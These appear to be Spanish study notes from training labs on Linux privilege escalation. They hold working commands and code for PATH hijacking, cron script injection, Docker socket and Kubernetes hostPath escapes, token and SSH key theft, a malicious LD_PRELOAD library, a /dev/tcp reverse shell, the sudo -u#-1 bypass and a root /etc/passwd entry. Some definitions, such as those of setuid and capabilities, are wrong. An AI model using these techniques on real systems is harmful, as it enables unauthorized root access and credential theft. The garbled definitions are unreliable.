# Linux Privilege Escalation

## Enumeration
- Generalmente vamos a empezar utilizando LinEnum, Linpeas, exploitSuggester, linux-exploit-suggester, etc.
- Hay varios puntos importantes a enumerar:
    - Version del OS
    - Version del Kernel
    - Servicios ejecutandose
- También podemos revisar `sudo -l` para ver que comandos podemos ejecutar con sudo.
- Podemos revisar los cronjobs `ls -la /etc/cron.daily/` y `ls -la /etc/cron.hourly/`
- Encontrar directorios con acceso a escritura: `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
- Encontrar archivos con acceso a escritura: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
- Encontrar scripts: `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
- Corriendo servicios como root: `ps aux | grep root`

## Path Abuse
- Definición: PATH es una variable de entorno que contiene una lista de directorios a los que el sistema busca ejecutables.
    - Ejemplo: cuando hacemos `cat /etc/passwd` el sistema busca el ejecutable `cat` en `/bin/cat` en los directorios especificados en la variable PATH.
- Podemos chequear el contenido de la variable PATH con `echo $PATH`
- Crear un script o programa especificado en el PATH lo hace ejecutable en cualquier lugar del sistema.
- Ejemplo de abuso:
```bash
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls
PATH ABUSE!!
```
#### Ejemplo de path abuse con setuid permissions
- Usamos: `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
- Nos aparece este binario `/bin/sysinfo` desconocido.
- Usamos `strings /bin/sysinfo` y vemos que utiliza el comando `lshw` para mostrar información del sistema.
- Entonces utilizamos strace para ver como se comporta el binario: `strace -f /bin/sysinfo 2>&1 | grep execve`
- Y vemos que llama a este programa sin un path definido.
- Entonces podemos redefinir el path de este binario hacia un binario malicioso para elevar privilegios
- `echo -e '#!/bin/bash\n/bin/bash -p' > lshw`
- `chmod +x lshw`
- `export PATH=`pwd`:$PATH`
- `/bin/sysinfo` **Y a partir de acá ya tenemos acceso root**

### Setuid permissions
- Definición: Setuid permissions permite a un proceso ejecutar comandos como el usuario que lo ejecuta. **Set User ID upon Execution (setuid)**
- El setuid bit aparece como una `s` en el lugar del bit de ejecución en el owner.
- `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
### Setgid permissions
- Definición: Setgid permissions permite a un proceso ejecutar comandos como el grupo que lo ejecuta.
- `find / -uid 0 -perm -6000 -type f 2>/dev/null`

## Capabilities
- Definición: Capabilities permiten a un proceso ejecutar comandos como el usuario que lo ejecuta.
- Generalmente se usan para ejecutar ciertos comandos como root.
- setcap definición: setea capabilities para un programa.
    - ejemplo: podemos usar `cap_net_bind_service` para poder ejecutar el comando `nc -l -p 80` como root.
    - `sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic`
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`: este comando hace un chequeo de los binarios que tienen capabilities.

| Capacidad              | Descripción                                                                                              |
|------------------------|----------------------------------------------------------------------------------------------------------|
| `cap_sys_admin`        | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. |
| `cap_sys_chroot`       | Permite cambiar el directorio raíz para el proceso actual, permitiéndole acceder a archivos y directorios que de otro modo serían inaccesibles. |
| `cap_sys_ptrace`       | Permite adjuntar y depurar otros procesos, potencialmente permitiendo acceder a información sensible o modificar el comportamiento de otros procesos. |
| `cap_sys_nice`         | Permite aumentar o disminuir la prioridad de los procesos, potencialmente permitiendo acceder a recursos que de otro modo estarían restringidos. |
| `cap_sys_time`         | Permite modificar el reloj del sistema, potencialmente permitiendo manipular marcas de tiempo o causar que otros procesos se comporten de manera inesperada. |
| `cap_sys_resource`     | Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar. |
| `cap_sys_module`       | Permite cargar y descargar módulos del kernel, potencialmente permitiendo modificar el comportamiento del sistema operativo o acceder a información sensible. |
| `cap_net_bind_service` | Permite enlazar a puertos de red, potencialmente permitiendo acceder a información sensible o realizar acciones no autorizadas. |


| Valor de Capacidad | Descripción                                                                                                      |
|--------------------|------------------------------------------------------------------------------------------------------------------|
| `=`                | Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad previamente establecida para el ejecutable. |
| `+ep`              | Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. |
| `+ei`              | Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite y que los procesos hijos generados por el ejecutable hereden la capacidad y realicen las mismas acciones. |
| `+p`               | Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable pero evitar que herede la capacidad o que los procesos hijos la hereden. |

| Capacidad          | Descripción                                                                                                      |
|--------------------|------------------------------------------------------------------------------------------------------------------|
| `cap_setuid`       | Permite a un proceso establecer su ID de usuario efectivo, lo que puede usarse para obtener los privilegios de otro usuario, incluido el usuario root. |
| `cap_setgid`       | Permite establecer su ID de grupo efectivo, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo root. |
| `cap_sys_admin`    | Esta capacidad proporciona una amplia gama de privilegios administrativos, incluyendo la capacidad de realizar muchas acciones reservadas para el usuario root, como modificar configuraciones del sistema y montar y desmontar sistemas de archivos. |
| `cap_dac_override` | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos. |

### Enumerar capabilities
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`: este comando hace un chequeo de los binarios que tienen capabilities.
### Explotando capabilities
- Ejemplo: `/usr/bin/vim.basic /etc/passwd`
    - `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
    - En este caso el binario vim.basic tiene la capacidad `cap_setuid` y `cap_setgid` por lo que podemos ejecutar el comando `id` como root..


### Abusar de cronjobs
- Primero  hay que encontrar directorios o archivos con acceso a escritura: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
- `cat /etc/crontab` para ver los cronjobs del sistema.
- `crontab -l -u root` para ver los cronjobs del usuario root.
- Ahora imaginemonos que hay un script corriendo como root, del cual tenemos acceso de escritura.
    - Podemos modificar el script para que ejecute un reverse shell haciendo un echo reverse shell + un shift right `>>` al script.
    - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /etc/cron.daily/script.sh`
    - `/tmp/bash -p` => root shell

### Docker privilege escalation
- La escalación de privilegios en Linux mediante Docker se basa en explotar configuraciones inseguras del demonio Docker. Un caso común ocurre cuando el socket de Docker `(/var/run/docker.sock)` es accesible por un usuario sin privilegios, lo que permite ejecutar contenedores con permisos elevados y, potencialmente, escapar al sistema host.
- `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`
    -  Este comando ejecuta un contenedor Ubuntu en modo chroot, permitiendo ejecutar comandos en el sistema host.
    - `docker -H unix:///var/run/docker.sock` Indica que Docker debe conectarse al socket UNIX `/var/run/docker.sock`, el cual es el punto de comunicación entre el cliente y el deamon de Docker.
    - Si un usuario tiene acceso a este socket, puede controlar Docker como root.
    - `run -v /:/mnt --rm -it ubuntu` Crea un contenedor Ubuntu en modo chroot, con acceso a la carpeta raíz del sistema host.
    - `chroot /mnt bash` Ejecuta el comando bash en el contenedor Ubuntu, permitiendo ejecutar comandos en el sistema host.
    - `--rm` Elimina el contenedor después de que se haya ejecutado el comando.

### Kubernetes privilege escalation
- Podemos utilizar la herramienta kubeletctl para obtener el token y certificado de la service account de Kubernetes del servidor.
    - Para hacer esto tenemos que tener la IP del server, el namespace y pod target.
- **Extract tokens** `kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token`
- **Extract certificates** `kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
- Ahora listamos privilegios:
    - `export token=`cat k8.token``
    - `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list`
- Ahora lo que podemos hacer es crear un YAML para crear un nuevo contenedor y montar el filesystem entero con la carpeta root adentro.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
##### Creando nuevo pod
- `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml`
- `kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`

## Shared Object Hijacking
- Definición: Shared Object Hijacking es un ataque que permite a un atacante inyectar código malicioso en un proceso que está ejecutando un binario compartido (como un servidor web o un servidor de bases de datos) para que el código se ejecute en el contexto del proceso.
- Podemos utilizar ldd para encontrar las librerías compartidas del binario: `ldd /usr/bin/binario
- Podemos encontrar las rutas de las librerías compartidas del binario: `strings /usr/bin/binario | grep "Shared object" | cut -d ":" -f 2`
- Si encontramos alguna libreria interesante pdemos cargar una libreria compartida personalizada, por ejemplo `LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmysqlclient.so.20.so /usr/bin/binario`
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

- `gcc src.c -fPIC -shared -o /development/libshared.so`

## Sudo policy bypass
- Sudo permite con un especifico id de usuario ejecutar comandos como root.
- El id especificado se encuentra en el fichero `/etc/passwd`.
- Ejemplo: `cat /etc/passwd | grep cry0l1t3` => `cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash`
- Podemos ver que este usuario tiene id 1005, si un id negativo entrase como sudo en procesar el id 0 que sería unicamente root.

```bash
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

- `sudo -u#-1` + binario permitido para ejecutar como root. = exploit

## Wildcards spare tricks
- Definición: Wildcards son caracteres especiales que permiten buscar y manipular archivos y directorios de manera más eficiente.
- **Ataque con 7z**: Se pueden crear archivos donde 7z se va a ejecutar y hacer un symlink attack para obtener acceso a archivos que no deberíamos tener acceso.
    - cd /path/to/7z/acting/folder
    - touch @root.txt
    - ln -s /file/you/want/to/read root.txt
- Pensar que con esto se puede conseguir `/root/.ssh/id_rsa`
- [Source](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)


## Flask Privilege Escalation
- Si tenemos un archivo de python editable que corre un servidor Flask, podemos inyectar código malicioso en el archivo para obtener acceso root.

```bash

jack@BitForge:~$ sudo -l
Matching Defaults entries for jack on bitforge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, !env_reset

User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer

``` 

-----


```python

from flask import Flask, render_template
import subprocess
import os

app = Flask(__name__)

@app.route("/")
def home():
    # Comando para iniciar una reverse shell al localhost:9000
    try:
        # Usamos /bin/bash para la reverse shell
        cmd = "/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9000 0>&1'"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return render_template("index.html")
    except Exception as e:
        return f"Error al iniciar la reverse shell: {str(e)}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
   
``` 

- Ahora si hacemos curl `curl http://localhost:5000/` nos va a dar una reverse shell.
- `nc -lvnp 9000` y tenemos acceso a la shell.



## Bash Gobbling
- Definición: Bash gobbling es un ataque que permite a un atacante ejecutar comandos arbitrarios en un sistema vulnerable al inyectar código malicioso en una variable de entorno.
- Este ataque se basa en la forma en que Bash maneja las variables de entorno y los argumentos de línea de comandos.
- Por ejemplo podemos tener un cronjob que ejecute un script de bash con una variable de entorno que contenga un comando malicioso.

```bash

[alfredo@fedora tmp]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

``` 

- En este caso el script de backup-flask.sh tiene una variable de entorno PATH que apunta a un directorio donde podemos colocar un script malicioso.
- ✅ Corre como root.
- ✅ El PATH pone una ruta controlada por el usuario primero.
- ✅ Ejecuta tar sin ruta absoluta.
- Nos paramos sobre el directorio que figura en la variable PATH y creamos un script que se llame `tar` que agarre el `/bin/bash` y le de el setuid bit para que corra como root.
- `echo -e '#!/bin/bash\nchmod +s /bin/bash' > tar`
- `chmod +x tar`
- Ahora esperamosa que el cronjob corra como root.
- `bash -p` y tenemos acceso a la shell como root.

## passwd con permisos de escritura
- Definición: El archivo `/etc/passwd` es un archivo de texto que contiene información sobre las cuentas de usuario en un sistema Linux. Cada línea del archivo representa una cuenta de usuario y contiene varios campos separados por dos puntos (:).
- Si un atacante puede escribir en este archivo, puede crear cuentas de usuario adicionales o modificar cuentas existentes, lo que puede llevar a la escalación de privilegios. 
- si podemos meter esta linea: `new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash` en el archivo `/etc/passwd` podemos obtener acceso root.
- pass123 es la contraseña de la cuenta new-user.